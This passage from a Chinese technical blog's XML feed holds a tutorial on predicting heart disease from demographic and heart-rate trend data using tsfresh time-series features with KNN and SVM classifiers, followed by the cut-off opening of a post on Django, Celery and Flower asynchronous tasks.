href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI机器学习时序序列特征提取实现分类预测实战</title>
      <link href="/posts/9421a9eb/"/>
      <url>/posts/9421a9eb/</url>
      
        <content type="html"><![CDATA[<p>最近有位做医疗项目的同学咨询有一批人员的身高、体重、性别、年龄、心电图、是否有心脏病等数据是否可以根据这些数据预测某个人是否有心脏病的迹象。这当然是可以的，AI机器学习不就是干这事的吗？这是一个典型的分类算法。根据这些人体特征来判断是否存在潜在的疾病。问题是如何对心电图进行特征提取，提取出相关的特征，让模型进行学习和训练。</p><p>拿到数据后，第一步，我们首先来看一下数据。</p><h2 id="一、数据探索"><a href="#一、数据探索" class="headerlink" title="一、数据探索"></a>一、数据探索</h2><h3 id="1、读入数据"><a href="#1、读入数据" class="headerlink" title="1、读入数据"></a>1、读入数据</h3><p>导入numpy、pandas、matplotlib三大件，读入数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">df=pd.read_csv(<span class="string">'data_csv.csv'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/1_%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="在这里插入图片描述"></p><p>数据集中有age年龄、ismale性别、Weight身高、Height体重、HRTrend心电图、label是否有心脏病（1，是有心脏病、0是无心脏病）<br>这里看到主要的几个关键性的指标。HRTrend是csv中载入的时候数据是文本字符串格式，还有nan及\n等字符串，我们要将这些数据进行清洗规则化，将其转化为数组。</p><h3 id="2、数据处理"><a href="#2、数据处理" class="headerlink" title="2、数据处理"></a>2、数据处理</h3><p>先拿一个样本数据来看看数据的情况。对它进行相应的处理，包括去掉回车换行符、去多余空格、然后以空格作为分隔形成数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HRTrend_Data=df[<span class="string">'HRTrend'</span>][<span class="number">1</span>][<span class="number">1</span>:len(df[<span class="string">'HRTrend'</span>][<span class="number">1</span>])<span class="number">-1</span>]</span><br><span class="line">HRTrend_Data=HRTrend_Data.replace(<span class="string">'\n'</span>,<span class="string">''</span>) <span class="comment">#替换掉换行符</span></span><br><span class="line">HRTrend_Data=HRTrend_Data.replace(<span class="string">'nan'</span>,str(<span class="number">0</span>))   <span class="comment">#将nan补0</span></span><br><span class="line">HRTrend_Data=re.sub(<span class="string">' +'</span>, <span class="string">' '</span>, HRTrend_Data).strip() <span class="comment">#去掉多余的空格</span></span><br><span class="line">HRTrend_Data=np.asarray([float(s) <span class="keyword">for</span> s <span class="keyword">in</span> HRTrend_Data.split(<span class="string">' '</span>)])  <span class="comment">#将字符串通过空格分隔，转换成数组</span></span><br><span class="line">pd.DataFrame(HRTrend_Data).plot()</span><br><span class="line">HRTrend_Data</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/2_%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86.png" alt="在这里插入图片描述"></p><p>这个图形不是很规则不平滑，看数据是因为异常值太多，后面的数据都是0，这些0都是因为数据为Non补充进来的，有可能是应为数据采集的时候某个点位没有采集到。我们需要将这些异常值给处理掉。<br>对于中间为0的，我们可以通过采用前值填充或者后值填充（也就是用前面的值或后面的值来替代为0的值），后面全部为0的部分要去掉。应为会影响到一些关键性的特征，如均值、50%的值、70%的值等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_HRTrend1=pd.DataFrame(HRTrend_Data)</span><br><span class="line">df_HRTrend1.describe()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/3_%E6%95%B0%E6%8D%AE%E6%8F%8F%E8%BF%B01.png" alt="在这里插入图片描述"></p><p>可以看到，这些异常值将会很大程度的影响一些关键特征，所以我们要处理异常值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HRTrend_Data=np.trim_zeros(HRTrend_Data)  <span class="comment">#去掉首尾的0</span></span><br><span class="line">df_data1=pd.DataFrame(HRTrend_Data)</span><br><span class="line">df_data1.replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>,inplace=<span class="literal">True</span>)  <span class="comment">#用前值替换掉中间的异常0</span></span><br><span class="line">df_data1.plot()</span><br><span class="line">df_data1.describe()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/4_%E6%95%B0%E6%8D%AE%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%90%8E.png" alt="在这里插入图片描述"></p><p>把刚对一个样本处理的过程写成一个函数，应用到所有的样本数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">procdata</span><span class="params">(df_dataclumn)</span>:</span></span><br><span class="line">    ary_data=df_dataclumn[<span class="number">1</span>:len(df_dataclumn)<span class="number">-1</span>]</span><br><span class="line">    ary_data=ary_data.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    ary_data=ary_data.replace(<span class="string">'nan'</span>,str(<span class="number">0</span>))</span><br><span class="line">    ary_data=re.sub(<span class="string">' +'</span>, <span class="string">' '</span>, ary_data).strip()</span><br><span class="line">    ary_data=np.asarray([float(s) <span class="keyword">for</span> s <span class="keyword">in</span> ary_data.split(<span class="string">' '</span>)])</span><br><span class="line">    ary_data=np.trim_zeros(ary_data)</span><br><span class="line">    df_data=pd.DataFrame(ary_data)</span><br><span class="line">    df_data.replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">    ary_data=df_data.values</span><br><span class="line">    <span class="keyword">return</span> ary_data</span><br><span class="line"></span><br><span class="line">df[<span class="string">'HRTrend'</span>]=df[<span class="string">'HRTrend'</span>].map(procdata)</span><br><span class="line">df[<span class="string">'Weight'</span>].replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>,inplace=<span class="literal">True</span>) <span class="comment">#去异常值</span></span><br><span class="line">df[<span class="string">'Height'</span>].replace(to_replace=<span class="number">0</span>, method=<span class="string">'ffill'</span>,inplace=<span class="literal">True</span>) <span class="comment">#去异常值</span></span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/5_%E5%8E%BB%E5%BC%82%E5%B8%B8%E5%80%BC%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE.png" alt="在这里插入图片描述"><br>找前六个样本看看效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fig,axes = plt.subplots(<span class="number">2</span>,<span class="number">3</span>,figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        axes[x,y].plot(df[<span class="string">'HRTrend'</span>][i])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/6_%E6%9F%A5%E7%9C%8B%E5%89%8D%E5%85%AD%E4%B8%AA%E6%95%B0%E6%8D%AE.png" alt="在这里插入图片描述"></p><h2 id="二、特征工程及模型训练"><a href="#二、特征工程及模型训练" class="headerlink" title="二、特征工程及模型训练"></a>二、特征工程及模型训练</h2><h3 id="方法一：通过描叙统计提取时序特征并进行模型训练"><a href="#方法一：通过描叙统计提取时序特征并进行模型训练" class="headerlink" title="方法一：通过描叙统计提取时序特征并进行模型训练"></a>方法一：通过描叙统计提取时序特征并进行模型训练</h3><ul><li>特征提取</li></ul><p>有量纲时序特征提取包括以内容。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/7_%E6%8F%8F%E8%BF%B0%E7%BB%9F%E8%AE%A1.png" alt="在这里插入图片描述"></p><p>可以看到，大部分内容都可以通过describe()获取。可以写个函数方法来获取相关的特征值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdescribefeatures</span><span class="params">(data)</span>:</span></span><br><span class="line">    df_feature=pd.DataFrame(data)</span><br><span class="line">    df_feature=df_feature.describe().T</span><br><span class="line">    range=df_feature[<span class="string">'max'</span>][<span class="number">0</span>]-df_feature[<span class="string">'min'</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> range,df_feature[<span class="string">'count'</span>][<span class="number">0</span>],df_feature[<span class="string">'mean'</span>][<span class="number">0</span>],df_feature[<span class="string">'std'</span>][<span class="number">0</span>],df_feature[<span class="string">'min'</span>][<span class="number">0</span>],df_feature[<span class="string">'25%'</span>][<span class="number">0</span>],df_feature[<span class="string">'50%'</span>][<span class="number">0</span>],df_feature[<span class="string">'75%'</span>][<span class="number">0</span>],df_feature[<span class="string">'max'</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">HRTrend_np=np.array(df[<span class="string">'HRTrend'</span>])</span><br><span class="line">HRTrend_features_ary=[getdescribefeatures(d) <span class="keyword">for</span> d <span class="keyword">in</span> HRTrend_np]</span><br><span class="line">df_HRTrend_features=pd.DataFrame(HRTrend_features_ary,columns=[<span class="string">'HRTrend'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(HRTrend_features_ary[<span class="number">0</span>]))])</span><br><span class="line">df_HRTrend_features</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/8_%E6%8F%8F%E8%BF%B0%E7%BB%9F%E8%AE%A1%E7%89%B9%E5%BE%81.png" alt="在这里插入图片描述"></p><p>将心电图提出的统计信息特征与年龄、性别、身高、体重等特征合并，形成特征集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data=df[[<span class="string">'age'</span>,<span class="string">'ismale'</span>,<span class="string">'Weight'</span>,<span class="string">'Height'</span>,<span class="string">'label'</span>]].join(df_HRTrend_features)</span><br></pre></td></tr></table></figure><p>预留15个样本做最后的预测看效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_train_data=df_data[<span class="number">0</span>:len(df_data)<span class="number">-15</span>]    <span class="comment">#训练数据</span></span><br><span class="line">df_predict_data=df_data[len(df_data)<span class="number">-15</span>:len(df_data)]  <span class="comment">#用于预测的数据</span></span><br></pre></td></tr></table></figure><ul><li>模型训练</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> f1_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> recall_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">x_tt, x_validation, y_tt, y_validation = train_test_split(x, y, test_size=<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># 将训练集再切分为训练集和测试集</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(x_tt, y_tt, test_size=<span class="number">0.25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将模型的名字和模型函数作为元组添加到列表当中存储；</span></span><br><span class="line">models = []</span><br><span class="line">models.append((<span class="string">"KNN"</span>,KNeighborsClassifier(n_neighbors=<span class="number">3</span>))) <span class="comment">#指定邻居个数</span></span><br><span class="line">models.append((<span class="string">"SVM Classifier"</span>,SVC(C=<span class="number">1000</span>)))</span><br><span class="line"><span class="comment">#可以通过参数C来控制精度，C越大要求精度越高；  C——错分点的惩罚度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环调用所有模型进行训练、预测</span></span><br><span class="line"><span class="keyword">for</span> clf_name, clf <span class="keyword">in</span> models:</span><br><span class="line">    clf.fit(x_train, y_train)</span><br><span class="line">    xy_lst = [(x_train, y_train), (x_validation, y_validation), (x_test, y_test)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(xy_lst)):</span><br><span class="line">        x_part = xy_lst[i][<span class="number">0</span>]  <span class="comment"># 为遍历中的第0部分</span></span><br><span class="line">        y_part = xy_lst[i][<span class="number">1</span>]  <span class="comment"># 为遍历中的第1部分</span></span><br><span class="line">        y_pred = clf.predict(x_part)</span><br><span class="line">        print(i)  <span class="comment"># i是下标，0表示训练集，1表示验证集，2表示测试集</span></span><br><span class="line">        print(clf_name, <span class="string">"ACC:"</span>, accuracy_score(y_part, y_pred))</span><br><span class="line">        print(clf_name, <span class="string">"REC:"</span>, recall_score(y_part, y_pred))</span><br><span class="line">        print(clf_name, <span class="string">"F-score:"</span>, f1_score(y_part, y_pred))</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/9_%E6%8F%8F%E8%BF%B0%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><p>SVM分类模型的效果要稍好于KNN的模型，但整体效果还不是很好。应该是提取的特征还是不够。我们来试下通过tsfresh提取时序特征并进行模型训练。</p><h3 id="方法二：通过tsfresh提取时序特征并进行模型训练"><a href="#方法二：通过tsfresh提取时序特征并进行模型训练" class="headerlink" title="方法二：通过tsfresh提取时序特征并进行模型训练"></a>方法二：通过tsfresh提取时序特征并进行模型训练</h3><ul><li>特征提取</li></ul><p>tsfresh可以自动提取各种时间特征，可以参考官方文档，一般的取最大、最小、偏度、峰度等统计指标这些都自动化集成了。<br><a href="https://tsfresh.readthedocs.io/en/latest/text/introduction.html" target="_blank" rel="noopener">https://tsfresh.readthedocs.io/en/latest/text/introduction.html</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/10_tsfresh.png" alt="在这里插入图片描述"></p><p>通过tsfresh提取时序特征代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tsfresh <span class="keyword">import</span> extract_features</span><br><span class="line"><span class="keyword">from</span> tsfresh <span class="keyword">import</span> select_features</span><br><span class="line">dfx_HRTrend=pd.DataFrame()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> df.index:</span><br><span class="line">    df_i=pd.DataFrame(df[<span class="string">'HRTrend'</span>][i],columns=[<span class="string">'HRTrend'</span>])</span><br><span class="line">    df_i[<span class="string">'id'</span>]=i</span><br><span class="line">    df_i[<span class="string">'time'</span>]=np.array(range(<span class="number">1</span>,len(df_i)+<span class="number">1</span>))</span><br><span class="line">    df_i[<span class="string">'label'</span>]=df[<span class="string">'label'</span>][i]</span><br><span class="line">    dfx_HRTrend=pd.concat(objs=[dfx_HRTrend,df_i])</span><br><span class="line"></span><br><span class="line">dfx_xtracted_features = extract_features(dfx_HRTrend,column_id=<span class="string">"id"</span>, column_sort=<span class="string">"time"</span>)</span><br><span class="line">dfx_xtracted_features</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/11_%E6%97%B6%E5%BA%8F%E7%89%B9%E5%BE%81%E6%89%A9%E5%B1%95.png" alt="在这里插入图片描述"></p><p>可以看到tsfresh自动提取了1574colums的特征，但是我们要选取与标签有相关性的特征。tsfresh可以自动做到这一点，通过tsfresh的select_features传入特征和标签来选择与标签有相关性的特征，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tsfresh.utilities.dataframe_functions <span class="keyword">import</span> impute</span><br><span class="line">impute(dfx_xtracted_features)</span><br><span class="line">df_HRTrend_features = select_features(dfx_xtracted_features, df[<span class="string">'label'</span>])</span><br><span class="line">df_HRTrend_features</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/12_%E6%97%B6%E5%BA%8F%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96.png" alt="在这里插入图片描述"></p><p>通过特征选择自动选取了有相关性的143个特征，比前面缩减了很多，有利于提高模型训练的效率和精度。<br>我们再来看一下模型训练的效果。<br>同样将心电图通过tsfresh提出的时序特征与年龄、性别、身高、体重等特征合并，形成特征集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data=df[[<span class="string">'age'</span>,<span class="string">'ismale'</span>,<span class="string">'Weight'</span>,<span class="string">'Height'</span>,<span class="string">'label'</span>]].join(df_HRTrend_features)</span><br></pre></td></tr></table></figure><p>预留15个样本做最后的预测看效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_train_data=df_data[<span class="number">0</span>:len(df_data)<span class="number">-15</span>]    <span class="comment">#训练数据</span></span><br><span class="line">df_predict_data=df_data[len(df_data)<span class="number">-15</span>:len(df_data)]  <span class="comment">#用于预测的数据</span></span><br></pre></td></tr></table></figure><p>模型训练</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> f1_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> recall_score</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line">x_tt, x_validation, y_tt, y_validation = train_test_split(x, y, test_size=<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># 将训练集再切分为训练集和测试集</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(x_tt, y_tt, test_size=<span class="number">0.25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将模型的名字和模型函数作为元组添加到列表当中存储；</span></span><br><span class="line">models = []</span><br><span class="line">models.append((<span class="string">"KNN"</span>,KNeighborsClassifier(n_neighbors=<span class="number">3</span>))) <span class="comment">#指定邻居个数</span></span><br><span class="line">models.append((<span class="string">"SVM Classifier"</span>,SVC(C=<span class="number">1000</span>)))</span><br><span class="line"><span class="comment">#可以通过参数C来控制精度，C越大要求精度越高；  C——错分点的惩罚度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#循环调用所有模型进行训练、预测</span></span><br><span class="line"><span class="keyword">for</span> clf_name, clf <span class="keyword">in</span> models:</span><br><span class="line">    clf.fit(x_train, y_train)</span><br><span class="line">    xy_lst = [(x_train, y_train), (x_validation, y_validation), (x_test, y_test)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(xy_lst)):</span><br><span class="line">        x_part = xy_lst[i][<span class="number">0</span>]  <span class="comment"># 为遍历中的第0部分</span></span><br><span class="line">        y_part = xy_lst[i][<span class="number">1</span>]  <span class="comment"># 为遍历中的第1部分</span></span><br><span class="line">        y_pred = clf.predict(x_part)</span><br><span class="line">        print(i)  <span class="comment"># i是下标，0表示训练集，1表示验证集，2表示测试集</span></span><br><span class="line">        print(clf_name, <span class="string">"ACC:"</span>, accuracy_score(y_part, y_pred))</span><br><span class="line">        print(clf_name, <span class="string">"REC:"</span>, recall_score(y_part, y_pred))</span><br><span class="line">        print(clf_name, <span class="string">"F-score:"</span>, f1_score(y_part, y_pred))</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/13_%E6%97%B6%E5%BA%8F%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96%E5%90%8E%E7%9A%84%E6%95%88%E6%9E%9C.png" alt="在这里插入图片描述"></p><p>可以看到不管是KNN模型和SVM的模型都取得了不错的效果。</p><h2 id="三、效果"><a href="#三、效果" class="headerlink" title="三、效果"></a>三、效果</h2><p>最后我们来看一下，用预留的15个样本预测的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pre_test_y=df_predict_data[<span class="string">'label'</span>]</span><br><span class="line">pre_test_x=df_predict_data.drop(columns=<span class="string">'label'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> clf_name, clf <span class="keyword">in</span> models:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pre_test_x.index:</span><br><span class="line">        y_predict=clf.predict(pre_test_x.loc[[i]])</span><br><span class="line">        predict_result=<span class="string">'预测错误！'</span></span><br><span class="line">        <span class="keyword">if</span> y_predict==pre_test_y.loc[[i]].values:</span><br><span class="line">            predict_result=<span class="string">'预测正确！'</span></span><br><span class="line">        print(<span class="string">'第'</span>+str(i)+<span class="string">'个样本'</span>+clf_name+<span class="string">' 预测y='</span>+str(y_predict)+<span class="string">'--实际 y='</span>+str(pre_test_y.loc[[i]].values)+<span class="string">' - '</span>+predict_result)</span><br><span class="line">    print(<span class="string">'-'</span>*<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>先是通过描叙统计提取时序特征并进行模型训练后模型预测的结果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/14_%E6%8F%8F%E5%8F%99%E7%BB%9F%E8%AE%A1%E9%A2%84%E6%B5%8B.png" alt="在这里插入图片描述"></p><p>还是有不少预测错误了。<br>再来看通过tsfresh提取时序特征并进行模型训练后模型预测的结果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230106/15_%E6%97%B6%E5%BA%8F%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96%E9%A2%84%E6%B5%8B.png" alt="在这里插入图片描述"></p><p>可以看到预留的15个样本都预测正确，取得了不错的效果！</p><p>本文通过心电图分类模型介绍了从数据处理、时序特征提取、模型训练和效果评估。验证了对于小数据量，通过tsfresh提取时序特征，往往能够取得很好的效果。</p><p>全部源代码及数据集见：<a href="https://download.csdn.net/download/fullbug/87369380" target="_blank" rel="noopener">https://download.csdn.net/download/fullbug/87369380</a></p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> AI机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django+Celery+Flower实现异步和定时任务及其监控告警</title>
      <link href="/posts/c2fa9556/"/>
      <url>/posts/c2fa9556/</url>
      
        <content type="html"><![CDATA[<p>用Django框架进行web开发非常的快捷方便，但Django框架请求/响应是同步的。但我们在实际项目中经常会碰到一些耗时的不能立即返回请求结果任务如：数据爬取、发邮件等，如果常时间等待对用户体验不是很好，在这种情况下就需要实现异步实现，马上返回响应请求，但真正的耗时任务在后台异步执行。Django框架本身无法实现异步响应但可以通过Celery很快的实现异步和定时任务。本文将介绍如何通过Django+Celery+Flower实现异步和定时任务及其任务的监控告警。</p><p>常见的任务有两类，一类是异步任务，一类是定时任务（定时执行或按一定周期执行）。Celery都能很好的支持。</p><p>Celery 是一个 基于python开发的分布式异步消息任务队列，通过它可以轻松的实现任务的异步处理， 如果你的业务场景中需要用到异步任务，就可以考虑使用celery， 举几个实例场景中可用的例子:</p><ul><li>异步任务：将耗时的操作任务提交给Celery去异步执行，比如发送短信/邮件、消息推送、音频处理等等</li><li>做一个定时任务，比如每天定时执行爬虫爬取指定内容</li></ul><p>Celery 在执行任务时需要通过一个消息中间件（Broker）来接收和发送任务消息，以及存储任务结果， 一般使用rabbitMQ、Redis或其他DB。</p><p>本文使用redis作为消息中间件和结果存储，在后面的通过数据库监控任务执行案例将介绍用到数据库作为结果存储。</p><h2 id="一、在Django中引入Celary"><a href="#一、在Django中引入Celary" class="headerlink" title="一、在Django中引入Celary"></a>一、在Django中引入Celary</h2><h3 id="1、安装库"><a href="#1、安装库" class="headerlink" title="1、安装库"></a>1、安装库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install celery</span><br><span class="line">pip install redis</span><br><span class="line">pip install eventlet  <span class="comment">#在windows环境下需要安装eventlet包</span></span><br></pre></td></tr></table></figure><h3 id="2、引入celary"><a href="#2、引入celary" class="headerlink" title="2、引入celary"></a>2、引入celary</h3><p>在主项目目录下，新建celary.py文件，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># 